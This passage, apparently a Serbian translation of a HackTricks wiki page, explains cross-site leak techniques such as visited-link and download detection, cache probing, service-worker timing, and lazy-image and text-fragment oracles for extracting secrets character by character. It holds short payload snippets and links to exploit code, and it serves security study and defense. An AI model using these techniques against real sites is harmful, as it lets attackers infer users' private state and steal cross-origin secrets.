Uprkos ovim ograničenjima, moguće je indirektno razaznati posetjeno stanje linka. Jedna tehnika uključuje prevaru korisnika da interaguje sa područjem koje je pogođeno CSS-om, posebno koristeći `mix-blend-mode` svojstvo. Ovo svojstvo omogućava mešanje elemenata sa njihovom pozadinom, potencijalno otkrivajući posetjeno stanje na osnovu interakcije korisnika.

Pored toga, detekcija se može postići bez korisničke interakcije iskorišćavanjem vremena renderovanja linkova. Pošto pregledači mogu renderovati posetjene i neposetjene linkove drugačije, to može uvesti merljivu vremensku razliku u renderovanju. Dokaz koncepta (PoC) je pomenut u izveštaju o grešci u Chromium-u, demonstrirajući ovu tehniku koristeći više linkova kako bi pojačali vremensku razliku, čime se posetjeno stanje može otkriti analizom vremena.

Za više detalja o ovim svojstvima i metodama, posetite njihove stranice dokumentacije:

- `:visited`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Curjenje

- **Metode Uključivanja**: Okviri
- **Uočljiva Razlika**: Zaglavlja
- **Više informacija**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Sažetak:** U Google Chrome-u, prikazuje se posvećena stranica greške kada je stranica blokirana od umetanja na stranici drugog porekla zbog X-Frame-Options ograničenja.
- **Primer Koda**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

U Chrome-u, ako je stranica sa `X-Frame-Options` zaglavljem postavljenim na "deny" ili "same-origin" umetnuta kao objekat, pojavljuje se stranica greške. Chrome jedinstveno vraća prazan dokument objekat (umesto `null`) za `contentDocument` svojstvo ovog objekta, za razliku od iframe-a ili drugih pregledača. Napadači bi mogli iskoristiti ovo otkrivajući prazan dokument, potencijalno otkrivajući informacije o stanju korisnika, posebno ako programeri dosledno ne postavljaju X-Frame-Options zaglavlje, često zanemarujući stranice greške. Svest i dosledna primena bezbednosnih zaglavlja su ključni za sprečavanje ovakvih curenja.

### Detekcija Preuzimanja

- **Metode Uključivanja**: Okviri, Pop-up prozori
- **Uočljiva Razlika**: Zaglavlja
- **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Sažetak:** Napadač može da razazna preuzimanje fajlova koristeći iframe; nastavak pristupa iframe-u implicira uspešno preuzimanje fajla.
- **Primer Koda**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` zaglavlje, posebno `Content-Disposition: attachment`, naređuje pregledaču da preuzme sadržaj umesto da ga prikaže unutar stranice. Ovo ponašanje se može iskoristiti za detekciju da li korisnik ima pristup stranici koja pokreće preuzimanje fajla. U Chromium-baziranim pregledačima, postoji nekoliko tehnika za detekciju ovog ponašanja preuzimanja:

1. **Praćenje Trake za Preuzimanje**:
- Kada se fajl preuzme u Chromium-baziranim pregledačima, traka za preuzimanje se pojavljuje na dnu prozora pregledača.
- Praćenjem promena u visini prozora, napadači mogu da zaključe o pojavljivanju trake za preuzimanje, sugerišući da je preuzimanje pokrenuto.
2. **Navigacija Preuzimanja sa Iframe-ima**:
- Kada stranica pokrene preuzimanje fajla koristeći `Content-Disposition: attachment` zaglavlje, to ne izaziva događaj navigacije.
- Učitavanjem sadržaja u iframe i praćenjem događaja navigacije, moguće je proveriti da li sadržaj dispozicije uzrokuje preuzimanje fajla (nema navigacije) ili ne.
3. **Navigacija Preuzimanja bez Iframe-a**:
- Slično tehnici iframe-a, ova metoda uključuje korišćenje `window.open` umesto iframe-a.
- Praćenje događaja navigacije u novootvorenom prozoru može otkriti da li je preuzimanje fajla pokrenuto (nema navigacije) ili se sadržaj prikazuje unutar stranice (navigacija se dešava).

U scenarijima gde samo prijavljeni korisnici mogu pokrenuti takva preuzimanja, ove tehnike se mogu koristiti za indirektno zaključivanje o stanju autentifikacije korisnika na osnovu odgovora pregledača na zahtev za preuzimanje.

### Zaobilaženje HTTP Keša <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Metode Uključivanja**: Pop-up prozori
- **Uočljiva Razlika**: Vreme
- **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Sažetak:** Napadač može da razazna preuzimanje fajlova koristeći iframe; nastavak pristupa iframe-u implicira uspešno preuzimanje fajla.
- **Primer Koda**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (iz [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> Ovo je razlog zašto je ova tehnika zanimljiva: Chrome sada ima **particionisanje keša**, a ključ keša nove otvorene stranice je: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, ali ako otvorim ngrok stranicu i koristim fetch u njoj, ključ keša će biti: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **ključ keša je različit**, tako da se keš ne može deliti. Više detalja možete pronaći ovde: [Sticanje bezbednosti i privatnosti deljenjem keša](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Komentar iz [**ovde**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Ako sajt `example.com` uključuje resurs sa `*.example.com/resource`, tada će taj resurs imati **isti ključ keša** kao da je resurs direktno **zatražen kroz navigaciju na vrhunskom nivou**. To je zato što se ključ keša sastoji od vrhunskog _eTLD+1_ i okvira _eTLD+1_.

Pošto je pristup kešu brži od učitavanja resursa, moguće je pokušati da promenite lokaciju stranice i otkažete je 20ms (na primer) nakon toga. Ako je poreklo promenjeno nakon zaustavljanja, to znači da je resurs bio keširan.\
Ili možete jednostavno **poslati neki fetch na potencijalno keširanu stranicu i izmeriti vreme koje je potrebno**.

### Ručno Preusmeravanje <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Metode Uključivanja**: Fetch API
- **Uočljiva Razlika**: Preusmeravanja
- **Više informacija**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Sažetak:** Moguće je saznati da li je odgovor na fetch zahtev preusmeravanje
- **Primer Koda**:

![](<../images/image (652).png>)

### Fetch sa AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Metode Uključivanja**: Fetch API
- **Uočljiva Razlika**: Vreme
- **Više informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Sažetak:** Moguće je pokušati učitati resurs i prekinuti pre nego što se učita. U zavisnosti od toga da li je greška izazvana, resurs je bio ili nije bio keširan.
- **Primer Koda**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Koristite _**fetch**_ i _**setTimeout**_ sa **AbortController** da detektujete da li je **resurs keširan** i da izbacite određeni resurs iz keša pregledača. Pored toga, proces se odvija bez keširanja novog sadržaja.

### Zagađenje Skripti

- **Metode Uključivanja**: HTML elementi (skripta)
- **Uočljiva Razlika**: Sadržaj stranice
- **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Sažetak:** Moguće je **prepisati ugrađene funkcije** i pročitati njihove argumente čak i iz **cross-origin skripti** (koje se ne mogu direktno pročitati), što može **otkriti dragocene informacije**.
- **Primer Koda**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Servisni Radnici <a href="#service-workers" id="service-workers"></a>

- **Metode Uključivanja**: Pop-up prozori
- **Uočljiva Razlika**: Sadržaj stranice
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Sažetak:** Merenje vremena izvršenja web-a koristeći servisne radnike.
- **Primer Koda**:

U datom scenariju, napadač preuzima inicijativu da registruje **servisnog radnika** unutar jednog od svojih domena, konkretno "attacker.com". Zatim, napadač otvara novi prozor na ciljanom vebsajtu iz glavnog dokumenta i naređuje **servisnom radniku** da započne tajmer. Kada novi prozor počne da se učitava, napadač navigira referencu dobijenu u prethodnom koraku na stranicu kojom upravlja **servisni radnik**.

Po dolasku zahteva pokrenutog u prethodnom koraku, **servisni radnik** odgovara sa **204 (No Content)** status kodom, efikasno prekidajući proces navigacije. U tom trenutku, **servisni radnik** beleži merenje sa tajmera pokrenutog ranije u drugom koraku. Ovo merenje je pod uticajem trajanja JavaScript-a koje uzrokuje kašnjenja u procesu navigacije.

> [!WARNING]
> U merenju vremena izvršenja moguće je **eliminisati** **mrežne faktore** kako bi se dobila **preciznija merenja**. Na primer, učitavanjem resursa korišćenih na stranici pre njenog učitavanja.

### Fetch Vreme

- **Metode Uključivanja**: Fetch API
- **Uočljiva Razlika**: Vreme (generalno zbog Sadržaja Stranice, Status Koda)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Sažetak:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvršavanje zahteva. Mogu se koristiti i drugi satovi.
- **Primer Koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Vreme između Prozorâ

- **Metode Uključivanja**: Pop-up prozori
- **Uočljiva Razlika**: Vreme (generalno zbog Sadržaja Stranice, Status Koda)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Sažetak:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvršavanje zahteva koristeći `window.open`. Mogu se koristiti i drugi satovi.
- **Primer Koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane od strane **najnaprednijih** alata zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Sa HTML ili Re Injekcijom

Ovde možete pronaći tehnike za eksfiltraciju informacija iz cross-origin HTML **injektovanjem HTML sadržaja**. Ove tehnike su zanimljive u slučajevima kada iz bilo kog razloga možete **injektovati HTML, ali ne možete injektovati JS kod**.

### Opušteni Markup

{{#ref}}
dangling-markup-html-scriptless-injection/
{{#endref}}

### Učitavanje Slika na Zahtev

Ako trebate **eksfiltrirati sadržaj** i možete **dodati HTML pre tajne**, trebali biste proveriti **uobičajene tehnike opuštenog markup-a**.\
Međutim, ako iz bilo kog razloga **MORATE** to učiniti **karakter po karakter** (možda je komunikacija putem keširanja), možete koristiti ovu trik.

**Slike** u HTML-u imaju atribut "**loading**" čija vrednost može biti "**lazy**". U tom slučaju, slika će se učitati kada se pogleda, a ne dok se stranica učitava:
```html
<img src=/something loading=lazy >
```
Zato, ono što možete učiniti je da **dodate puno beskorisnih karaktera** (Na primer **hiljade "W"**) da **popunite veb stranicu pre tajne ili dodate nešto poput** `<br><canvas height="1850px"></canvas><br>.`\
Tada, ako na primer naša **injekcija pojavi pre zastavice**, **slika** će biti **učitana**, ali ako se pojavi **posle** **zastavice**, zastavica + beskorisni podaci će **sprečiti da se učita** (biće potrebno da eksperimentišete sa količinom beskorisnih podataka koje treba dodati). Ovo se desilo u [**ovoj analizi**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Druga opcija bi bila da koristite **scroll-to-text-fragment** ako je dozvoljeno:

#### Scroll-to-text-fragment

Međutim, vi omogućavate **botu da pristupi stranici** sa nečim poput
```
#:~:text=SECR
```
Dakle, veb stranica će izgledati ovako: **`https://victim.com/post.html#:~:text=SECR`**

Gde post.html sadrži napadničke junk karaktere i sliku koja se učitava lenjo, a zatim se dodaje tajna bota.

Ovaj tekst će omogućiti botu da pristupi bilo kom tekstu na stranici koji sadrži tekst `SECR`. Pošto je taj tekst tajna i nalazi se **ispod slike**, **slika će se učitati samo ako je pogodna tajna tačna**. Tako imate svoj orakl da **ekstrahujete tajnu karakter po karakter**.

Neki primer koda za iskorišćavanje ovoga: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Učitavanje slika na osnovu vremena

Ako **nije moguće učitati eksternu sliku** koja bi mogla da označi napadaču da je slika učitana, druga opcija bi bila da se pokuša da se **pogodi karakter nekoliko puta i meri to**. Ako se slika učita, svi zahtevi bi trajali duže nego ako se slika ne učita. Ovo je korišćeno u [**rešenju ovog izveštaja**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sažeto ovde:**

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Ako se koristi `jQuery(location.hash)`, moguće je saznati putem vremena **da li neki HTML sadržaj postoji**, to je zato što ako selektor `main[id='site-main']` ne odgovara, ne mora da proverava ostatak **selektora**:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection

{{#ref}}
xs-search/css-injection/
{{#endref}}

## Odbrane

Postoje preporučene mere ublažavanja na [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) kao i u svakoj sekciji wiki [https://xsleaks.dev/](https://xsleaks.dev/). Pogledajte tamo za više informacija o tome kako se zaštititi od ovih tehnika.

## Reference

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
